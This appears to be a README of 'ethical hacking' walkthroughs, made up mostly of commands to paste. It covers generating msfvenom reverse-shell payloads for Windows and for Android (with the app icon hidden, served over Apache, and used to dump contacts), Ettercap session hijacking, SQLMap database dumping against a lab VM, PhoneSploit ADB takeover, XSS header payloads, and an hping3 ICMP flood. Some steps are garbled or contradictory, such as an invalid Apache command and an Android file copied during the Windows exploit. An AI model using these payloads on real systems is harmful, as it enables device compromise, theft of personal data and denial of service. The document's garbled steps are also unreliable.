# Advanced_3thical_H@cking

## Exploit 1: Metasploit Trojan

This exploit demonstrates the use of Metasploit to deploy a Trojan on a Windows x64 system.

### Steps:
1. Gain root access:
    ```bash
    sudo -i root
    ```

2. Generate the payload using msfvenom:
    ```bash
    msfvenom -p windows/x64/vncinject/reverse_tcp LHOST=<ip addr> LPORT=<port number> -f exe -o payload.exe
    ```

3. Set up an Apache server to host the payload:
    ```bash
    apache2 > server host 
    ```

4. Move the Android payload to the server directory:
    ```bash
    cp androidpayload.apk /var/www/html
    ```

5. Clean up server files:
    ```bash
    sudo rm -f index.html index.nginx-debian.html
    ```

6. Launch Metasploit console:
    ```bash
    msfconsole
    ```

7. Configure the handler:
    ```bash
    use exploit/multi/handler
    set payload windows/x64/vncinject/reverse_tcp
    set LHOST <ip addr>
    set LPORT <port number>
    show options
    ```

8. Execute the exploit:
    ```bash
    exploit
    ```

9. If successful, the connection will be established to the RFB server using protocol version 3.8.

## Exploit 2: Log Analyzer

This exploit demonstrates the setup and configuration of a log analyzer using ManageEngine EventLog Analyzer.

### Steps:
1. Install ManageEngine EventLog Analyzer server.

2. Access the server in a web browser using the following credentials:
    - Username: admin
    - Password: admin

3. Navigate to the device management section:
    - Click on "Add" > "Device".
    - Go to "Settings" > "Devices Management" > "Syslog Devices".

4. Add devices:
    - Click on "Add Device(s)" in the popup.
    - Choose "Discover & Add".
    - Enter the IP range and click "Next".
    - Select all devices found during the scan and click "Add Device".

5. Configure log collection filter:
    - Go to admin settings.
    - Navigate to log collection filter.
    - Check all options and add a new filter.

6. Configuration is complete. The log analyzer is now ready to analyze logs according to the specified settings.

## Exploit 3: TCP/IP Hijacking

This exploit demonstrates the use of Ettercap for TCP/IP hijacking.

### Steps:
1. Open Ettercap:
    - Launch the Ettercap tool.

2. Set interface:
    - Set the interface to eth0 or the appropriate network interface.

3. Open a browser and visit the target login page:
    - Example URL: http://testphp.vulnweb.com/login.php

4. Execute the hijacking:
    - With Ettercap running and the interface set, perform the TCP/IP hijacking while the target user is logged in.

5. The attacker can now intercept, modify, or manipulate the traffic between the victim's browser and the target website.

## Exploit 4: Null Byte

This exploit involves exploiting vulnerabilities in a Null Byte vulnerable machine.

### Steps:
1. Start the Null Byte vulnerable machine.

2. Perform a network scan using Nmap:
    - Use the following command: `nmap -A </24>` to scan the network for vulnerable hosts.

3. Download an image from a web browser:
    - Navigate to a website hosting images and download an image file.

4. Use Exiftool to analyze the image:
    - Run `exiftool <image>` to extract metadata from the downloaded image. Look for comments.

5. Exploit SQL injection vulnerability using SQLMap:
    - Execute SQLMap with the following command:
      ```
      sqlmap -u http://192.168.40.129/kzmb5nVYJw/420search.php?usrtosearch=1 -D seth --dump-all --batch
      ```

6. Decode the retrieved data:
    - Locate the table named 'pass' and decode the value found in it.
    - Decode the value using Base64.
    - Further decode the value using MD5.

7. Find the password:
    - After decoding, the password should be revealed.

8. Utilize the Null Byte exploit:
    - Use the following credentials:
      - Username: rq;ses
      - Password: o;egq

## Exploit 5: Metasploit Android

This exploit demonstrates the use of Metasploit to deploy a payload on an Android device.

### Steps:
1. Generate the payload using msfvenom:
    ```bash
    msfvenom -p android/meterpreter/reverse_tcp AndroidhideAppIcon=true LHOST=<ip addr> LPORT=<port number> -f raw -o androidpayload.apk
    ```

2. Install Apache web server:
    ```bash
    sudo apt install apache2
    ```

3. Start, check status, and enable Apache:
    ```bash
    systemctl start apache2
    systemctl status apache2
    systemctl enable apache2
    ```

4. Move the Android payload to the Apache server directory:
    ```bash
    cp androidpayload.apk /var/www/html
    ```

5. Clean up server files:
    ```bash
    sudo rm -f index.html index.nginx-debian.html
    ```

6. Download the payload on an Android device:
    - Open a web browser on the Android device and navigate to `<ip address>`.
    - Download the androidpayload.apk file.

7. Install the .apk file on the Android device.

8. Launch Metasploit console:
    ```bash
    msfconsole
    ```

9. Configure the handler:
    ```bash
    use exploit/multi/handler
    set payload android/meterpreter/reverse_tcp
    set LHOST=<ip addr>
    set LPORT=<port number>
    show options
    ```

10. Execute the exploit:
    ```bash
    exploit
    ```

11. Once the session is connected, use the following commands:
    ```bash
    dump_contacts
    cat dump_contacts
    ```

## Exploit 6: PhoneSploit

This exploit demonstrates the use of PhoneSploit for exploiting Android devices.

### Steps:
1. Clone the PhoneSploit-Pro repository:
    ```bash
    git clone https://github.com/AzeemIdrisi/PhoneSploit-Pro
    ```

2. Navigate to the PhoneSploit-Pro directory:
    ```bash
    cd PhoneSploit-Pro
    ```

3. Install the required dependencies:
    ```bash
    pip install -r requirements.txt
    ```

4. Install ADB (Android Debug Bridge):
    ```bash
    sudo apt install adb
    ```

5. Run the PhoneSploit script:
    ```bash
    python3 phonesploitpro.py
    ```

6. Type 'y' to confirm starting PhoneSploit.

7. Scan for devices:
    - Choose option 13 to scan for connected Android devices.

8. Connect to the Android device:
    - Choose option 2 to connect to the desired Android device.

## Exploit 7: Burpsuite Injection

This exploit demonstrates how to perform an XSS injection using Burpsuite.

### Steps:
1. Access the target website:
    - Navigate to https://e2e93238.poison.digi.ninja:2443/basic.php in a web browser.

2. Open Burpsuite:
    - Launch Burpsuite and ensure the proxy intercept is turned on.

3. Intercept and modify the request:
    - Send the request to the repeater.
    - Modify the request by changing the `X-Forwarded-Host` header to inject malicious JavaScript code.

4. Example of injected payloads:
    ```plaintext
    X-Forwarded-Host: www.vasa.com”><script>alert(“You are hacked”)</script>
    X-Forwarded-Host: www.vasanth.com"><script>alert("your hacked buddy")</script>
    ```

5. Click "Send" to send the modified request.

6. Check for pop-up:
    - After sending the modified request, check the web browser for any pop-up alerts triggered by the injected JavaScript code.

## Exploit 8: DoS Attack in Windows

This exploit demonstrates a Denial of Service (DoS) attack targeting a Windows machine.

### Steps:
1. Set up the attacker machine:
    - Use `hping3` to flood the target machine with ICMP packets:
      ```bash
      hping3 --flood --icmp <ip addr>
      ```

2. Monitor network traffic with Wireshark:
    - Open Wireshark on the attacker machine to observe the packet flooding.

3. Set up the victim machine (Windows):
    - Open the Task Manager on the Windows machine by pressing `Ctrl + Shift + Esc`.
    - Monitor the CPU usage to detect any abnormalities caused by the DoS attack.

4. During the attack, observe the impact on the victim machine:
    - The victim machine may experience high CPU usage, network congestion, and possibly become unresponsive due to the flood of ICMP packets.

**Note:** This document is created solely for educational purposes. 
It is intended to demonstrate various security vulnerabilities and exploit techniques for educational and ethical learning purposes. 
It should not be used for any malicious activities or to harm individuals or compromise their privacy.
Always ensure you have appropriate authorization before conducting any security testing or exploitation activities.
